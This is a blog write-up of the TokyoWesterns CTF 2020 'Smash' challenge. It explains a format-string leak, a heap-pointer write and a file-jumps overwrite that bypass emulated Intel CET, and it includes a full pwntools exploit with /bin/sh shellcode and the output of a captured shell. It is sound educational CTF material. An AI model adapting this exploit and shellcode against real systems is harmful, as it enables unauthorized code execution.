<!doctype html><html class="dark light"><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="width=device-width,initial-scale=1.0" name=viewport><title>
         Smash - TokyoWesterns CTF 2020
        
    </title><meta content="Smash - TokyoWesterns CTF 2020" property=og:title><link href=https://pwnverse.github.io/fonts.css rel=stylesheet><script>(function(){var a=document.createElement('script');a.setAttribute('src','/js/imamu.js');a.setAttribute('data-website-id','74344cd8-1e87-4c38-8acd-f96049b8f07e');a.setAttribute('data-host-url','https:&#x2F;&#x2F;analytics.eu.umami.is');document.body.appendChild(a)})()</script><script async data-host-url=https://analytics.eu.umami.is data-website-id=74344cd8-1e87-4c38-8acd-f96049b8f07e src=/js/imamu.js></script><script async data-goatcounter=https://Cyb0rG.goatcounter.com/count src=https://pwnverse.github.io/js/count.js></script><noscript><img src="https://Cyb0rG.goatcounter.com//count?p=/posts/smash/&t=Smash - TokyoWesterns CTF 2020"></noscript><link title="Cyb0rG's Home" href=https://pwnverse.github.io/atom.xml rel=alternate type=application/atom+xml><link href=https://pwnverse.github.io/theme/light.css rel=stylesheet><link href=https://pwnverse.github.io/theme/dark.css id=darkModeStyle rel=stylesheet><link href=https://pwnverse.github.io/main.css media=screen rel=stylesheet><body><div class=content><header><div class=main><a href=https://pwnverse.github.io>Cyb0rG's Home</a><div class=socials><a class=social href=https://twitter.com/_Cyb0rG rel=me> <img alt=twitter src=/social_icons/twitter.svg> </a><a class=social href=https://github.com/PwnVerse/ rel=me> <img alt=github src=/social_icons/github.svg> </a></div></div><nav><a href=/posts style=margin-left:.7em>/posts</a><a href=/projects style=margin-left:.7em>/projects</a><a href=/about style=margin-left:.7em>/about</a> | <a href=javascript:void(0) id=dark-mode-toggle onclick=toggleTheme()> <img id=sun-icon src=/feather/sun.svg style=filter:invert(1)> <img id=moon-icon src=/feather/moon.svg> </a><script src=https://pwnverse.github.io/js/themetoggle.js></script></nav></header><main><article><div class=title><div class=page-header>Smash - TokyoWesterns CTF 2020<span class=primary-color style=font-size:1.6em>.</span></div><div class=meta>Posted on <time>2020-09-22</time></div></div><section class=body><p><strong>tl;dr</strong><ul><li>Leak with Format String bug.<li>Use the arbitrary heap pointer write to overwrite <code>__GI__IO_file_jumps</code>.<li>Inject shellode in heap and get code execution in <code>dfprintf</code>.</ul><p>&LTi!--more--><p><strong>Challenge Points:</strong> 388 <strong>Solves:</strong> 9<p>We really had a great time this weekend playing this year's edition of TokyoWesterns CTF. In this post I'd like to share the intended solution for the challenge <strong>Smash</strong> which we could not solve during the CTF but the idea and the concept involved is worth sharing.<h2 id=challenge-description>Challenge description</h2><p>To begin with , we've been provided with the challenge binary , <code>libc 2.31</code>, a runner bash script and a folder containing Intel's tool called Control-flow Enforcement Technology (CET).This was our first tackel with Intel's CET and the concept involved is truly worth sharing.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>gdb</span><span style=color:#f29668>-</span><span>peda$ checksec
</span><span>CANARY    </span><span style=color:#bfbab0cc>: </span><span>disabled
</span><span>FORTIFY   </span><span style=color:#bfbab0cc>: </span><span>ENABLED
</span><span>NX        </span><span style=color:#bfbab0cc>: </span><span>ENABLED
</span><span>PIE       </span><span style=color:#bfbab0cc>: </span><span>ENABLED
</span><span>RELRO     </span><span style=color:#bfbab0cc>: </span><span>FULL
</span></code></pre><p>All mitigations except canary have been enabled.<h2 id=reversing>Reversing</h2><ul><li>The input name function takes 0x20 bytes of user input and then does an <code>strdup</code> which stores our input on heap.<li>Next , <code>dprintf</code> is called on our input without any format specifier, hence we can leak required addresses with the format string bug.<li>After this , we're asked to enter <code>y</code> or <code>n</code> and if <code>y</code> is entered , the program further asks for another <code>input message</code> and then takes in another 0x38 bytes of input.<li>If <code>n</code> is entered , the program prints <code>Bye</code> with dprintf and directly exits.</ul><p>Pretty straight forward, but where are the bugs?<h2 id=exploit-development>Exploit development</h2><p>We actually have 2 overflows which let us corrupt rbp and pivot to almost anywhere, but wait, CET doesn't allow us to execute ROP chain directly. We have to find a way to get code execution.<h3 id=how-intel-s-cet-works>How Intel's CET works</h3><p>Control-Flow Enforcement Technology promises to guard a binary against attacks such as ROP, JOP etc. It does so by allocating a <code>shadow stack</code> in mapped memory region. Whenever a function is called, apart from storing the return address on the program's thread stack , it also stores it on the shadow stack. So whenever the program returns from the function, the return address is comapared with the one stored on the shadow stack , if a match is found, the program executes smoothly, and if not , the program aborts thus mitigating ROP.<p>Intel SDE provides an emulation that includes:<ul><li>Stack checks<li>Indirect branch checks</ul><p>From the above discussion, one thing gets clear , every function that is executed in the supervision of CET needs to begin with <code>endbr64</code>. Let's just bear that in mind and continue.<h2 id=in-search-of-arbitrary-write>In search of arbitrary write</h2><p>Since we have our required leaks , we can now corrupt rbp with our first overflow in the step where program asks us to enter <code>y</code> or <code>n</code>.<p>An important observation to be made here is that , after reading our input and storing on heap with strdup, the program copies the heap pointer to an offset of <code>rbp-0x8</code>.<p>Since , we overwrote rbp with an address of our choice , after the function executes <code>leave</code> , the rbp will be updated with the value that we specified.<p>Immediately after that, the following instructions copy the heap pointer storing our input to <code>rbp-0x8</code>.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>mov</span><span>    QWORD PTR </span><span style=color:#ff7733>[</span><span>rbp</span><span style=color:#ff7733>-</span><span>0x8</span><span style=color:#ff7733>]</span><span>,rax
</span><span style=color:#ffb454>mov</span><span>    rax,QWORD PTR </span><span style=color:#ff7733>[</span><span>rbp</span><span style=color:#ff7733>-</span><span>0x8</span><span style=color:#ff7733>]
</span></code></pre><p>Thus , we have an arbitrary write of a heap pointer.<h2 id=defeating-cet>Defeating CET</h2><p>After analyzing a bit , we found out that the emulator that the CTF has provided us with does not check for the <code>NX</code> bit and few pages have been marked <code>read-write-executable</code> allowing us to now inject shellcode.<p>Now that we can execute shellode, we have to now select a target to get code execution.<h2 id=dprintf-to-the-rescue>dprintf to the rescue</h2><p>One important aspect of dprintf is that it uses a <code>temporary file structure</code> to carry out it's operations. With file structure operations, we can find out apt targets to get code execution. One such target function pointer is <code>_IO_new_file_finish</code> which is called internally inside <code>dprintf</code>.<p>So , now our plan is :<ul><li>Overwrite rbp to point to <code>_IO_new_file_finish + 8</code>.<li>Copy heap address to <code>_IO_new_file_finish</code>.<li>Fill heap with shellcode as CET doesn't implement NX.<li>Get code execution in dprintf.</ul><p>Here's the full exploit code.<pre class=language-py data-lang=py style=background:#0f1419;color:#bfbab0><code class=language-py data-lang=py><span>
</span><span style=color:#ff7733>from </span><span>pwn </span><span style=color:#ff7733>import </span><span style=color:#f29718>*
</span><span style=color:#ff7733>import </span><span>sys
</span><span>
</span><span>LIBC </span><span style=color:#f29668>= </span><span style=color:#ffb454>ELF</span><span>(</span><span style=color:#c2d94c>'./libc-2.31.so'</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>checksec </span><span style=color:#f29668>= </span><span style=color:#f29718>False</span><span>)
</span><span style=color:#ff7733>if</span><span>(</span><span style=color:#f07178>len</span><span>(sys</span><span style=color:#f29668>.</span><span>argv)</span><span style=color:#f29668>></span><span style=color:#f29718>1</span><span>):
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>remote</span><span>(</span><span style=color:#c2d94c>"pwn01.chal.ctf.westerns.tokyo"</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>29246</span><span>)
</span><span>    context</span><span style=color:#f29668>.</span><span>noptrace </span><span style=color:#f29668>= </span><span style=color:#f29718>True
</span><span style=color:#ff7733>else</span><span>:
</span><span>    io</span><span style=color:#f29668>=</span><span style=color:#ffb454>process</span><span>(</span><span style=color:#c2d94c>"./smash"</span><span>)
</span><span>
</span><span>reu </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvuntil</span><span>(a)
</span><span>sla </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendlineafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>sl </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendline</span><span>(a)
</span><span>rel </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recvline</span><span>()
</span><span>sa </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>b </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>sendafter</span><span>(a</span><span style=color:#bfbab0cc>,</span><span>b)
</span><span>re </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>recv</span><span>(a)
</span><span>s </span><span style=color:#f29668>= </span><span style=color:#ff7733>lambda </span><span style=color:#f29718>a </span><span>: io</span><span style=color:#f29668>.</span><span style=color:#ffb454>send</span><span>(a)
</span><span>
</span><span>
</span><span style=color:#ff7733>if </span><span>__name__ </span><span style=color:#f29668>== </span><span style=color:#c2d94c>"__main__"</span><span>:
</span><span>    gdb</span><span style=color:#f29668>.</span><span style=color:#ffb454>attach</span><span>(io)
</span><span>    </span><span style=color:#ffb454>sla</span><span>(</span><span style=color:#c2d94c>'> '</span><span style=color:#bfbab0cc>,</span><span style=color:#c2d94c>'</span><span style=color:#f29718>%p </span><span style=color:#c2d94c>'</span><span style=color:#f29668>*</span><span style=color:#f29718>9</span><span>)
</span><span>    </span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>55</span><span>)
</span><span>    stack </span><span style=color:#f29668>= </span><span style=font-style:italic;color:#39bae6>int</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>14</span><span>)</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>16</span><span>)
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"stack = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(stack))
</span><span>    </span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>1</span><span>)
</span><span>    code </span><span style=color:#f29668>= </span><span style=font-style:italic;color:#39bae6>int</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>14</span><span>)</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>16</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x1216
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"code = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(code))
</span><span>    </span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>7</span><span>)
</span><span>    libc </span><span style=color:#f29668>= </span><span style=font-style:italic;color:#39bae6>int</span><span>(</span><span style=color:#ffb454>re</span><span>(</span><span style=color:#f29718>14</span><span>)</span><span style=color:#bfbab0cc>,</span><span style=color:#f29718>16</span><span>) </span><span style=color:#f29668>- </span><span style=color:#f29718>0x270b3
</span><span>    log</span><span style=color:#f29668>.</span><span style=color:#ffb454>info</span><span>(</span><span style=color:#c2d94c>"libc = " </span><span style=color:#f29668>+ </span><span style=color:#f07178>hex</span><span>(libc))
</span><span>    target_stack </span><span style=color:#f29668>= </span><span>code </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x40e8 </span><span style=font-style:italic;color:#5c6773>#to be changed
</span><span>    inp </span><span style=color:#f29668>= </span><span>stack </span><span style=color:#f29668>- </span><span style=color:#f29718>0x60
</span><span>    IO_file_jumps </span><span style=color:#f29668>= </span><span>libc </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x1ed4a0
</span><span>    pop_rdi </span><span style=color:#f29668>= </span><span>code </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x000013d3
</span><span>    payload  </span><span style=color:#f29668>= </span><span style=color:#ff7733>b</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\xf3\x0f\x1e\xfa</span><span style=color:#c2d94c>" </span><span style=font-style:italic;color:#5c6773># endbr64
</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ff7733>b</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05</span><span style=color:#c2d94c>"
</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ff7733>b</span><span style=color:#c2d94c>"</span><span style=color:#95e6cb>\x90</span><span style=color:#c2d94c>" </span><span style=color:#f29668>* </span><span>(</span><span style=color:#f29718>0x30 </span><span style=color:#f29668>- </span><span style=color:#f07178>len</span><span>(payload))
</span><span>    payload </span><span style=color:#f29668>+= </span><span style=color:#ffb454>p64</span><span>(IO_file_jumps </span><span style=color:#f29668>+ </span><span style=color:#f29718>0x10 </span><span style=color:#f29668>+ </span><span style=color:#f29718>8</span><span>)[</span><span style=color:#bfbab0cc>:</span><span style=color:#f29718>6</span><span>]
</span><span>    </span><span style=color:#ffb454>sa</span><span>(</span><span style=color:#c2d94c>'[y/n] '</span><span style=color:#bfbab0cc>,</span><span>payload)
</span><span>    </span><span style=font-style:italic;color:#5c6773>#sla('message > ','write to shadow')
</span><span>    io</span><span style=color:#f29668>.</span><span style=color:#ffb454>interactive</span><span>()
</span></code></pre><p>Remember that the shellcode has to be started with <code>endbr64</code> instruction to bypass the indirect branch instruction check.<pre class=language-sh data-lang=sh style=background:#0f1419;color:#bfbab0><code class=language-sh data-lang=sh><span style=color:#ffb454>[+]</span><span> Opening connection to pwn01.chal.ctf.westerns.tokyo on port 29246: Done
</span><span style=color:#ffb454>[!]</span><span> Skipping debug attach since context.noptrace==True
</span><span style=color:#ffb454>[*]</span><span> stack = 0x7fffc7eb4d00
</span><span style=color:#ffb454>[*]</span><span> code = 0x55a74550c000
</span><span style=color:#ffb454>[*]</span><span> libc = 0x7f498f5bb000
</span><span style=color:#ffb454>[*]</span><span> Switching to interactive mode
</span><span>
</span><span style=color:#ffb454>Bye!
</span><span style=color:#ffb454>$</span><span> ls
</span><span style=color:#ffb454>flag.txt
</span><span style=color:#ffb454>run.sh
</span><span style=color:#ffb454>sde
</span><span style=color:#ffb454>sde.tgz
</span><span style=color:#ffb454>smash
</span><span style=color:#ffb454>$</span><span> cat flag.txt
</span><span style=color:#ffb454>TWCTF{17_15_ju57_4n_3mul470r,n07_r34l_CET</span><span>}
</span></code></pre><h2 id=conclusion>Conclusion</h2><p>This was one of the most interesting challenges I had come across in a while. The idea of a faulty emulator and CET was really cool. Kudos to team TokyoWesterns for such a cool challenge and such an awesome CTF.</section></article></main></div>